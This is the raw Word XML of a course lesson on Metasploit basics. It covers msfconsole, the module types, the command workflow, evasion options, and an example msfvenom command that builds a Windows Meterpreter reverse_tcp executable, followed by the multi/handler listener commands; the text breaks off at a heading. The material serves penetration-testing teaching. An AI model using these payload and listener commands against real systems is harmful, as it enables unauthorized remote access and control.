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2D3D8" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Day 12 — Metasploit Framework Basics</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6965C1C9" w14:textId="6C3609CB" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Today we will</w:t>
      </w:r>
      <w:r w:rsidR="00000000" w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00000000" w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>explains</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00000000" w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00000000" w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00000000" w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> interface, various module types, the workflow of using Metasploit commands, the msfvenom tool for payload creation, listener setup with exploit/multi/handler, and concepts such as encoders, NOPs, and evasion.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FC81E52" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>1. msfconsole</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B403BFB" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>The msfconsole is the primary interactive command-line interface for the Metasploit Framework. It allows users to search for, configure, and execute modules. When started, it displays a summary of available modules, including exploits, auxiliary modules, payloads, encoders, nops, evasion, and post modules.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A49E054" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>2. Module Types in Metasploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F2FCFAE" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Metasploit uses a modular architecture, with each module type serving a specific purpose:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="183F25E6" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>• Exploit — Code that leverages a specific vulnerability to execute arbitrary code on a target system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="499D9A62" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>• Payload — The code delivered and executed on the target after exploitation, such as Meterpreter or a shell.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E38736C" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>• Auxiliary — Modules for scanning, enumeration, fuzzing, and other non-exploitation tasks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B0DD90" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>• Post — Modules executed after gaining access, used for maintaining persistence or gathering information.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A30A34C" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>• Encoder — Transforms the payload to remove bad characters or alter its byte patterns.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56F5671C" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>• NOP (No Operation) — Generates padding instructions useful in exploits like buffer overflows.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F818879" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>• Evasion — Modules designed to modify payload delivery to bypass detection mechanisms.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="475D41A1" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>3. Typical Metasploit Workflow</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FAB95C1" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>A common sequence of commands in msfconsole includes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549CE5E7" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>1. search &lt;term&gt; — Searches for modules matching the term.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="222CB220" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>2. use &lt;module-path&gt; — Loads the desired module.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BA3BFC" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>3. show options — Displays required and optional parameters.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E9BFB87" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>4. set &lt;option&gt; &lt;value&gt; — Configures the module's parameters.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310D40BC" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>5. exploit or run — Executes the module.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64794C34" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>4. show evasion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C6D53EA" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>The show evasion command lists evasion options for modules that support them. These options can help in modifying network or binary behavior to avoid detection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2938F680" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>5. msfvenom Payload Creation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="095552B6" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>msfvenom is used to generate standalone payloads in various formats. It replaced the older msfpayload and msfencode tools.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2952CB2A" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Example command:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6848C2D4" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;your-IP&gt; LPORT=4444 -f exe -o windows_payloads.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A671E2D" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Explanation of parameters:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70FD720C" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>• -p — Specifies the payload.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="460D1E0F" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>• LHOST — The local host IP address to connect back to.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00470E47" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>• LPORT — The local port for the reverse connection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40FB71B1" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>• -f — Output format (exe in this case).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09455A1D" w14:textId="77777777" w:rsidR="008646CA" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>• -o — Output file name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D1238C" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6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cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75F5D1BC" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6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cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="449EBEFC" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>6. Starting a Listener</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1911A915" w14:textId="785EBC1A" w:rsidR="008646CA" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Metasploit provides exploit/multi/handler to act as a generic listener for payloads. For reverse payloads, it is crucial to start the listener before executing the payload on the target.</w:t>
      </w:r>
      <w:r w:rsidR="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26E518D7" w14:textId="3DF6B5DD" w:rsidR="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Commands:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E00870E" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1549E979" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>msf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>&gt; use exploit/multi/handler</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F8E8213" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>msf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> exploit(handler) &gt; set payload windows/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2920F8CE" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>msf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> exploit(handler) &gt; set LHOST &lt;your-IP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F5D1DF" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>msf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> exploit(handler) &gt; set LPORT 4444</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3E45FD" w14:textId="21814C74" w:rsidR="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>msf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> exploit(handler) &gt; run      # or `exploit`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2387EB30" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="559054CF" w14:textId="77777777" w:rsidR="008646CA" w:rsidRPr="00F42DE6" w:rsidRDefault="00000000" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
